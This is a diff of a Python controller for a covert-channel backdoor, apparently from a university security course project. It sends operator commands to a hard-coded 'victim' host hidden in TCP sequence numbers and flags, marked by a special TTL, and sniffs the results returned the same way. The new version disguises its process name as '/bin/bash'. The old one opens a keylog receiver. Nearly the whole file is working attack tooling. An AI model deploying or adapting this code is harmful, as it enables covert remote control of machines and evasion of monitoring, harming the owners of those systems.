@@ -1,132 +1,154 @@
-import sys # For getting command line arguments
-from scapy.all import * #Scapy library used to craft packets
-from AESCipher import AESCipher
-import time #used for thread sleep methods
-import argparse #used for easy arguments
-import thread
+#!/usr/bin/python3
 
-'''
-TCP Flags:
-'F': 'FIN', 0x01
-'S': 'SYN', 0x02
-'R': 'RST', 0x04
-'P': 'PSH', 0x08
-'A': 'ACK', 0x10
-'U': 'URG', 0x20
-'E': 'ECE', 0x40
-'C': 'CWR', 0x80
-'''
+import optparse
+import os
+import subprocess
+import sys
+import time
+from bkutil import *
+from multiprocessing import Process
+from cryptoutil import encrypt, decrypt
+from scapy.all import *
+import _thread
+import setproctitle
 
-packet = None
+"""
+Setup: pip3 install pycrypto setproctitle scapy watchdog
+"""
+
+TTL = 222
+TTLKEY = 234
+# random secret key (both the client and server must match this key)
+
+victim = ("192.168.0.3", 9999)
+messages = []
+authentication = "1337"
+setFlag = "E"
+
+myip = ("192.168.0.3", 66)
 
 
-#Function :construct()
-#Argument: character to send, destination address, flag to set
-#Purpose: Takes in the specified letter and dst addr as arguments and creates the pkt.
-#         I will set the Echo flag so the server knows that this is the secret datagram
-#         meant to recieve. I will also be placing the msg in the sequence number in
-#         the TCP header, and setting a timer with random times to send out the packets
-#         to make the traffic look normal
-def construct(char, setFlag):
-    global ttlKey
-    #  ord ==> converts the string character (length of 1) to an integer value represented
-    #          through Unicode. The server will then decode this unicode value.
-    letter = ord(char)
-    destPort = random.randint(0,50000)
-    packet = IP(dst=args.dest, ttl=ttlKey)/TCP(sport=letter, dport=destPort, flags=setFlag)
+def secret_send(msg: str, type: str = 'command'):
+    """
+    Keyword arguments:
+    msg      - payload being sent
+    type     - file or command (default:command)
+    """
+    if(type == "command"):
+        # Convert message to ASCII to bits
+        msg = message_to_bits(msg)
+        chunks = message_spliter(msg)
+        packets = packatizer(chunks)
+        for packet in packets:
+            send(packet, verbose=False)
+            pass
+
+
+def packatizer(msg):
+    """[summary]
+    
+    Arguments:
+        msg {[type]} -- [description]
+    
+    Returns:
+        [type] -- [description]
+    """
+
+    # Create the packets array as a placeholder.
+    packets = []
+    # If the length of the number is larger than what is allowed in one packet, split it
+    counter = 0
+
+    # If not an array (if there is only one packet.)
+    if(type(msg) is str):
+        # The transmissions position and total will be 1.
+        # i.e. 1/1 message to send.
+        packets.append(craft(msg))
+    # If an array (if there is more than one packet)
+    elif(type(msg) is list):
+        while (counter < len(msg)):
+            # The position will be the array element and the total will be the
+            # length.
+            # i.e. 1/3 messages to send.
+            packets.append(craft(msg[counter]))
+            counter = counter + 1
+    packets.append(IP(dst=victim[0], ttl=TTL) /
+                   TCP(sport=myip[1], dport=victim[1], flags="U"))
+    return packets
+
+
+def craft(data: str) -> IP:
+    """[summary]
+    
+    Arguments:
+        data {str} -- [description]
+    
+    Returns:
+        IP -- [description]
+    """
+
+    global TTL
+    global setFlag
+    # The payload contains the unique password, UID, position number and total.
+    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],
+                                            seq=int(str(data), 2), flags=setFlag)
     return packet
-	
-	
-'''
-sendCommand sends the commands covertly and encrypted
-'''
-def sendCommand(command):
-    global cipher
-	global setFlag
-	global endFlag
-	randPort = random.randint(0,50000)
-    encrypt_Command = cipher.encrypt(command)
-	command = str(encrypt_Command)
-    #packet = craft(encrypt_Command)
-	for i in command:
-		constructedPkt = construct(i, setFlag)
-		#  send is a function imported with Scapy
-		#  now we send the constructed packet
-		send(constructedPkt)
-	endOfOutput = IP(dst=args.dest, ttl=ttlKey)/TCP(sport=randPort, dport=randPort, flags=endFlag)
-	send(endOfOutput)
+
+
+def server():
+    """[summary]
+    """
+
+    while True:
+        try:
+            # Prompt user for the command they would like to execute on the backdoor.
+            command = input("ENTER COMMAND: {}:".format(victim[0]))
+        except EOFError as e:
+            print(e)
+        # Print the command so that the user knows what they typed.
+        print(command)
+        # If the user types "exit". shutdown the program.
+        if(command == "exit"):
+            sys.exit()
+        else:
+            secret_send(command)
 
 
 def commandResult(packet):
-    global ttlKey
-    global args
-    global cipher
-    global output
-	global validSource
-    srcIP = packet[IP].src
+    """[summary]
+    
+    Arguments:
+        packet {[type]} -- [description]
+    """
+
+    global TTLKEY
+    global messages
     ttl = packet[IP].ttl
-    if packet["IP"].src == validSource and packet[IP].ttl == ttlKey:
-        counter += 1
+    if(packet.haslayer(IP) and ttl == TTLKEY):
+        # checks if the flag has been set to know it contains the secret results
         flag = packet['TCP'].flags
         #  the client set an "Echo" flag to make sure the receiver knows it's truly them
         if flag == 0x40:
-            #  we used ord in the client to convert the string character into a Unicoded value
-            #  chr() now encodes the Unicoded value back as a string literal
-            #  the message is stored in the sequence number field of the TCP header
-            letter = chr(packet['TCP'].sport)
-            output.append(letter)
-        #End Flag detected
+            field = packet[TCP].seq
+            # Converts the bits to the nearest divisible by 8
+            covertContent = lengthChecker(field)
+            messages.append(text_from_bits(covertContent))
+        # End Flag detected
         elif flag == 0x20:
-            print("END REACHED")
-            print ("The Output:",*output,sep='\n')
-            finalO = ('\n'.join(output))
-            print (finalO)
-            output = []
-        #Congestion Flag detected
-		elif flag == 0x80:
-			'''
-			How to open a new terminal from script
-			-- Tested on Ubuntu 14.04.3 LTS
-			os.system("x-terminal-emulator -e /bin/bash")
-			'''
-			subprocess.call(['gnome-terminal', '-x', './recvKeylog.py'])		
-    else:
-        return
+            payload = str(''.join(messages)[2:-2]).replace("\\n", '\n')
+            print('\n', payload)
+            messages = []
 
 
-def commandSniffer(threadName, infectedIP):
-    sniff(filter="tcp and host "+args.dest, prn=commandResult)
+def commandSniffer():
+    sniff(filter="tcp and host "+victim[0], prn=commandResult)
 
-#GLOBAL VARIABLES
-ttlKey = 159
-key = 'mysecretpassword'
-IV = "abcdefghijklmnop"
-cipher = AESCipher(key)
-output = []
-validSource = "192.168.0.11"
-setFlag = "E"
-endFlag = "U"
 
-# parse command line argument
-arg_parser = argparse.ArgumentParser(
-    prog='Basic Backdoor',
-    description='COMP 8505 Final Project by Peyman Tehrani Parsa & Khang Tran'
-)
-arg_parser.add_argument('-d', dest='dest', type = str, help = 'target ip', required=True)
-arg_parser.add_argument('-p', dest='port', type = int, help = 'target port',default=99,const=99, nargs='?')
-args = arg_parser.parse_args()
-exit=["exit","quit","exit()","quit()"]
+setproctitle.setproctitle("/bin/bash")  # set fake process name
+# print(setproctitle.getproctitle())
 
-try:
-   thread.start_new_thread( commandSniffer, ("commandSniffer",args.dest) )
-except Exception as e:
-    print (str(e))
+sniffThread = threading.Thread(target=commandSniffer)
+sniffThread.daemon = True
+sniffThread.start()
 
-while True:
-    command = input('\033[92m'+args.dest+":"+str(args.port)+" ready"+'\033[0m')
-    if command == "":
-        continue
-    elif any(item == command for item in exit):
-        sys.exit()
-    else:
-        sendCommand(command)
+server()
